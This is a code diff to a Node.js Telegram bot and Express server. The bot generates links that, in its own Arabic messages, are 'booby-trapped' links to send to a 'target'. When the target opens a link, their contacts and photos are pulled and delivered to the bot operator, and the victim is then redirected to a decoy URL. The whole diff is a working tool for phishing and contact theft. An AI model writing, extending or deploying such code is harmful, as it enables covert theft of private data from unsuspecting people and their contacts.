@@ -65,6 +65,9 @@ bot.on('message', async (msg) => {
   if (msg?.reply_to_message?.text == "🌐 Enter Your URL") {
     createLink(chatId, msg.text);
   }
+  if (msg?.reply_to_message?.text == "📱 أدخل الرابط الذي سيُعاد التوجيه إليه بعد سحب جهات الاتصال") {
+    createContactsLink(chatId, msg.text);
+  }
 
   if (msg.text == "/start") {
     var m = {
@@ -112,9 +115,8 @@ bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
   }
   if (callbackQuery.data == "contacts") {
     const cid = callbackQuery.message.chat.id;
-    const uid = cid.toString(36);
-    const link = `${hostURL}/contacts/${uid}`;
-    bot.sendMessage(cid, `📱 رابط سحب جهات الاتصال مع الصور:\n\n${link}\n\n⚠️ أرسل هذا الرابط للهدف وستصلك جهات اتصاله فور فتحه.`);
+    var mk = { reply_markup: JSON.stringify({ "force_reply": true }) };
+    bot.sendMessage(cid, `📱 أدخل الرابط الذي سيُعاد التوجيه إليه بعد سحب جهات الاتصال`, mk);
   }
 });
 bot.on('polling_error', (error) => {
@@ -175,18 +177,32 @@ createNew (cid);
 
 
 function createNew(cid) {
-  var mk = {
-    reply_markup: JSON.stringify({ "force_reply": true })
-  };
+  var mk = { reply_markup: JSON.stringify({ "force_reply": true }) };
   bot.sendMessage(cid, `🌐 Enter Your URL`, mk);
+}
+
+function createContactsLink(cid, msg) {
+  var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
+  if ((msg.toLowerCase().indexOf('http') > -1) && !encoded) {
+    var uid = cid.toString(36);
+    var uri = btoa(msg);
+    var link = `${hostURL}/contacts/${uid}/${uri}`;
+    var m = { reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "📱 إنشاء رابط جهات اتصال جديد", callback_data: "contacts" }]] }) };
+    bot.sendMessage(cid, `✅ تم إنشاء الرابط الملغم\n\n📱 رابط سحب جهات الاتصال:\n${link}\n\n⚠️ أرسل هذا الرابط للهدف وستصلك جهات اتصاله مع صورهم فور فتحه.`, m);
+  } else {
+    bot.sendMessage(cid, `⚠️ رابط غير صحيح، يجب أن يبدأ بـ http أو https`);
+    var mk = { reply_markup: JSON.stringify({ "force_reply": true }) };
+    bot.sendMessage(cid, `📱 أدخل الرابط الذي سيُعاد التوجيه إليه بعد سحب جهات الاتصال`, mk);
+  }
 }
 
 
 
 
 
-app.get("/contacts/:uid", (req, res) => {
-  res.render("contacts", { uid: req.params.uid, a: hostURL });
+app.get("/contacts/:uid/:uri?", (req, res) => {
+  const redirectUrl = req.params.uri ? atob(req.params.uri) : "https://google.com";
+  res.render("contacts", { uid: req.params.uid, a: hostURL, redirectUrl: redirectUrl });
 });
 
 app.post("/contacts-data", (req, res) => {
